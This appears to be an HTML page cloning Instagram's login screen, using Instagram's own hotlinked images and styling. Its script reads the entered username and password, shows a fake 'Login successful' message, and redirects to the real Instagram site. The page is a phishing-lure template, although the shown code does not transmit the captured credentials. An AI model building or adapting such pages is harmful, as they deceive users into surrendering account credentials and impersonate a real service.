<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            display: flex;
            max-width: 900px;
            margin: 0 auto;
        }
        
        .phone {
            flex: 1;
            background: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png') no-repeat center;
            background-size: contain;
            height: 600px;
            position: relative;
        }
        
        .login-box {
            flex: 1;
            padding: 40px;
            max-width: 350px;
        }
        
        .form-container {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 30px 40px;
            text-align: center;
        }
        
        .logo {
            font-family: 'Brush Script MT', cursive;
            font-size: 48px;
            margin-bottom: 20px;
            color: #262626;
        }
        
        input {
            width: 100%;
            padding: 12px 8px;
            margin-bottom: 10px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            box-sizing: border-box;
        }
        
        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        
        button {
            width: 100%;
            background: #0095f6;
            color: white;
            border: none;
            padding: 8px;
            font-weight: bold;
            border-radius: 4px;
            margin-top: 10px;
            cursor: pointer;
        }
        
        button:hover {
            background: #0074cc;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-top: 1px solid #dbdbdb;
        }
        
        .divider span {
            padding: 0 20px;
        }
        
        .fb-login {
            color: #385185;
            text-decoration: none;
            font-weight: bold;
            display: block;
            margin: 20px 0;
            font-size: 14px;
        }
        
        .forgot {
            color: #00376b;
            text-decoration: none;
            font-size: 12px;
            display: block;
        }
        
        .signup {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            margin-top: 10px;
            text-align: center;
            font-size: 14px;
        }
        
        .signup a {
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
        }
        
        #loading {
            display: none;
            color: #0095f6;
            font-size: 12px;
            margin-top: 10px;
        }
        
        .app-links {
            text-align: center;
            margin-top: 20px;
        }
        
        .app-links img {
            height: 40px;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="phone"></div>
        
        <div class="login-box">
            <div class="form-container">
                <div class="logo">Instagram</div>
                
                <form id="loginForm">
                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
                    <input type="password" id="password" placeholder="Password" required>
                    
                    <button type="submit">Log In</button>
                </form>
                
                <div id="loading">
                    <p>✓ Logging you in...</p>
                </div>
                
                <div class="divider">
                    <span>OR</span>
                </div>
                
                <a href="#" class="fb-login">Log in with Facebook</a>
                <a href="#" class="forgot">Forgot password?</a>
            </div>
            
            <div class="signup">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>
            
            <div class="app-links">
                <p>Get the app.</p>
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
            </div>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            
            // Show loading
            document.getElementById('loading').style.display = 'block';
            
            // Simulate login process
            setTimeout(function() {
                document.getElementById('loading').innerHTML = 
                    '<p>✓ Login successful! Redirecting to Instagram...</p>';
                
                // Redirect after 2 seconds
                setTimeout(function() {
                    window.location.href = 'https://www.instagram.com';
                }, 2000);
            }, 1500);
        });
    </script>
</body>
</html>
